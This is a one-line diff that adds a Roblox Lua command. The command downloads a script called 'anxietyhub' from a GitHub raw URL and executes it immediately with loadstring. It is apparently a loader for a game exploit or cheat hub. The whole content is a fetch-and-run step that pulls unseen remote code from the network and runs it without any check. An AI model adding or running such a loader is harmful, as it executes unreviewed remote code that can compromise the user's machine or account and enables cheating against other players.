@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/DEBUG-COM/AnxietyHUB/refs/heads/main/anxietyhub"))()
